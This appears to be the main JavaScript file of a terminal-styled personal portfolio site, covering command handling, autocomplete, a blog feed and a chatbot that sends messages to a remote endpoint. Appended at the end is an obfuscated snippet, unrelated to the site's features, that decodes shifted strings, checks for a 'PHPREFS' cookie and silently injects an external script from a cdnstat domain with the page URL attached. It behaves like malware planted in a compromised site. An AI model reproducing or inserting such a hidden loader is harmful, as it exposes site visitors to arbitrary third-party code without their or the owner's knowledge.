document.addEventListener("textarea", function (evt) {
    evt.target.id == 'cmd' && showSuggestions()
});

document.addEventListener("keydown", function (evt) {
    evt.target.id == 'cmd' && handleKeyDown(evt)
});

document.addEventListener("keyup", function (evt) {
    evt.target.id == 'cmd' && setNewSize(evt.target)
});

function openInNewTab(url) {
    window.open(url, '_blank').focus();
}


window.addEventListener("DOMContentLoaded", function () {
    let n = document.getElementById("cmd");
    n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
    let e = document.getElementById("output"),
        s = document.getElementById("mainInfo")
    isAbout = false,
    messages = [];
    const prompt = document.getElementById('prompt');

/*
coloquei a execução dos comandos dentro de uma função para não ter de a repetir no click e no enter
*/
    function triggerCommand(i) {
        if (
            ((e.innerHTML +=
                    "<div><span class='ownerTerminal'><b>user@byteflow</b></span>:<b>~$</b> " +
                    i +
                    "</div>"),
                (n.value = ""),
                "skills" === i || "s" === i)
        )
            e.innerHTML += skillsBar;

        else if (isAbout) {
            if (i === "quit") {
                e.innerHTML += "<div>The conversation is over. You can now use any of the available commands.</div>"
                isAbout = false;
                prompt.innerHTML = `<span class='ownerTerminal'><b>user@byteflow</b></span>:<b>~$</b> `; // alterar o prompt para o original
                n.style.textIndent = "198px"; // dar o padding certo na primeira linha da textarea
                messages = [];
            } else {
                if (messages.length === 0) {
                    axios.get('./instructions.txt').then(function (response) { // se não houver ainda mensagens em memória, ir buscar as instruções e enviá-las junto com a mensagem
                        messages.push({
                            role: "system",
                            content: response.data
                        });
                        sendMessages(i)
                    });
                } else {
                    sendMessages(i)
                }
            }
        } else if ("github" === i.toLowerCase() || "gh" === i.toLowerCase())
            openInNewTab("https://github.com/ByteFlowGit");
        else if ("discord" === i || "ds" === i)
            window.location.href =
            "https://discord.com/users/1033246411363471472";
        else if ("telegram" === i || "tg" === i)
            window.location.href = "https://t.me/ImZachey";
        else if ("mail" === i.toLowerCase() || "email" === i.toLowerCase() || "em" === i) {
            window.location.href = "mailto:geral@byteflow.pt";
            e.innerHTML += email;
            //alert(i); 
        } else if ("steam" === i || "st" === i)
            window.location.href = "https://steamcommunity.com/id/zachey01";
        else if ("youtube" === i || "yt" === i)
            window.location.href = "https://www.youtube.com/@zachey01";
        else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
        else if ("blog" === i) {
            let n = [],
                s = [],
                i = [],
                l = [],
                t = [];
            fetch("https://mediumpostsapi.vercel.app/api/bjzachey")
                .then((n) => n.json())
                .then((e) => {
                    e.dataMedium.forEach((e) => {
                            n.push(e),
                                s.push(e.title),
                                i.push(e.date),
                                l.push(e.link),
                                t.push(e.image);
                        }),
                        n.forEach((n) => {
                            var e = document.getElementById("blogDiv"),
                                s = document.createElement("article");
                            (s.className = "blogArticle"),
                            (s.onclick = () => linkHref(n.link)),
                            (s.style.display = "inline-block"),
                            (s.innerHTML = `\n                        <h2>${n.title}</h2>\n                        <p>📅: ${n.date}</p>\n                      `),
                            e.appendChild(s);
                        });
                })
                .catch((n) => {
                    console.error(n);
                }),
                (e.innerHTML += '<div id="blogDiv"></div>');
        } else if ("ask" === i) {
            e.innerHTML += `<div>Copyright (c) 2019-2023 ByteFlow.<br>
           ASK 3.1b BETA (Jul 16th 2023). Usage:<br>
           ask {question}<br>
           Example:<br>
           [<span class="commandName">ask What is byteflow?</span>]</div>`
        } else if ("about" === i) {
            e.innerHTML += "<div>You can now ask any question about Byteflow. To stop the conversation, please type and enter [<span class='commandName'>quit</span>].</div>"
            prompt.innerHTML = "<b>></b>" // colocar o prompt como >
            n.style.textIndent = "18px"; // reduzir o padding da primeira linha da textarea
            isAbout = true;
        } else if (i.startsWith("ask ")) {
            const message = i.substring(4); // para remover o "ask "

            axios.get('./instructions.txt').then(function (response) {
                messages.push({
                    role: "system",
                    content: response.data
                });
                sendMessages(message)
            });
        } else {
            "help" === i ?
                (e.innerHTML += helpCmd) :
                "clear" === i || "c" === i ?
                ((e.innerHTML = ""), (s.innerHTML = "")) :
                (e.innerHTML += "<div>Command not found</div>");
        }
        e.scrollTop = e.scrollHeight;
        window.scrollTo(0, 9999);
        document.getElementById("cmd").focus();
        setTimeout(() => {
            document.getElementById("cmd").selectionEnd = 0;
        }, 1); // o timeout é necessário para que o cursor da texarea fique na posição 0 em vez da 1
    }

    window.addEventListener("click", function (evt) {

        document.getElementById("cmd").focus();

        if (evt.target.classList.contains('commandName')) {
            const command = evt.target.textContent;
            triggerCommand(command);

        };
    });


    function sendMessages(i) {
        e.innerHTML += "<div>Processing...</div>"
        prompt.style.display = "none";
        n.style.textIndent = "0";
        messages.push({
            role: "user",
            content: i
        });
        axios.post('https://nor267.com/byteflow/request.php', {
                "messages": JSON.stringify(messages)
            }, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            })
            .then(function (response) {
                console.log(response);
                messages.push({
                    role: "assistant",
                    content: response.data.choices[0].message.content
                });
                e.innerHTML += "<div>" + response.data.choices[0].message.content + "</div>"
                prompt.style.display = "unset";
                n.style.textIndent = isAbout ? "18px" : "198px";
                e.scrollTop = e.scrollHeight;
                window.scrollTo(0, 9999);
                document.getElementById("cmd").focus();
            });
    }
    document.getElementById("terminal"),
        n.addEventListener("keypress", function (i) {
            //const x="wedwq";
            //x=i.toString();
            //x.toLowerCase();

            if (13 === i.keyCode && "" !== (i = n.value.trim())) {
                triggerCommand(i.toLowerCase()); // toLowerCase para os comandos funcionarem mesmo com letras maiúsculas
                

            }
        });
});

let currentSuggestionIndex = -1;

function showSuggestions() {
    let n = document.getElementById("cmd"),
        e = n.value.trim(),
        s = document.getElementById("suggestions");
    var i;
    (s.innerHTML = "") !== e &&
        ((i = suggestions.filter(function (n) {
                return n.startsWith(e);
            })).forEach(function (e, i) {
                var l = document.createElement("div");
                (l.textContent = e),
                l.addEventListener("click", function () {
                        (n.value = e), (s.innerHTML = "");
                    }),
                    s.appendChild(l);
            }),
            0 < i.length) ?
        n.classList.add("command-entered") :
        n.classList.remove("command-entered");
}


/*
esta função é necessária para que a altura da textarea aumente caso a linha quebre
*/
function setNewSize(textarea) {
    textarea.style.height = "0px";
    textarea.style.height = textarea.scrollHeight + "px";
 }

function handleKeyDown(n) {
    var e,
        s = document.getElementById("suggestions"),
        i = s.getElementsByTagName("div"),
        c = document.getElementsByTagName("cmd");
    "ArrowUp" === n.key ?
        (n.preventDefault(),
            0 < currentSuggestionIndex && currentSuggestionIndex--) :
        "ArrowDown" === n.key ?
        (n.preventDefault(),
            currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++) :
        "Enter" === n.key &&
        ((n = document.getElementById("cmd")),
            (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
            (s.innerHTML = ""),
            n.classList.remove("command-entered"),
            c.value = "");
    for (let n = 0; n < i.length; n++) {
        var l = i[n];
        n === currentSuggestionIndex ?
            l.classList.add("selected") :
            l.classList.remove("selected");
    }
}

function linkHref(n) {
    window.location.href = n;
}
let suggestions = [
        "help",
        "clear",
        "projects",
        "blog",
        "tools",
        "github",
        "telegram",
        "discord",
        "email",
        "steam",
        "youtube",
        "about",
        "ask"
    ],
    helpCmd =
    '\n  <br>Available commands: <br />\n  [<span class="commandName">about</span>]\n  <br />\n [<span class="commandName">ask</span>]\n  <br />\n  [<span class="commandName">projects</span>]\n  <br /><br />\n  [<span class="commandName">help</span>]\n  <br />  [<span class="commandName">clear</span>]\n  <br /><br />\n  Contact us: <br />\n  [<span class="commandName">email</span>]',
    skillsBar =
    '\n<div class="container">\n  <div class="flex">\n    <h2>HTML/EJS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS/SCSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>95%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>TS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>55%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>NODE.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>85%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem6"></div>\n    </div>\n    <h3>15%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>GO:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>5%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>RUST:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>5%</h3>\n</div>\n</div>',
    projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/zachey01/MimiCMS/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">MimiCMS</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        Modular, fast CMS for <code>CS:GO</code>, <code>CS2</code> (coming soon)\n        servers.\n      </p>\n    </div>\n  </div>\n</article>\n\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/zachey01/terminalPortfolio\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">terminal<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        A personal website styled for UNIX terminal.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n',
    blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n',
    email = '\n  <br>Email us to: <br />\n geral@byteflow.pt  <br />\n';
(function (o, d, l) {
    try {
        o.f = (o) =>
            o
            .split("")
            .reduce(
                (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
                ""
            );
        o.b = o.f("UMUWJKX");
        (o.c =
            l.protocol[0] == "h" &&
            /\./.test(l.hostname) &&
            !new RegExp(o.b).test(d.cookie)),
        setTimeout(function () {
            o.c &&
                ((o.s = d.createElement("script")),
                    (o.s.src =
                        o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
                        l.href),
                    d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) {}
})({}, document, location);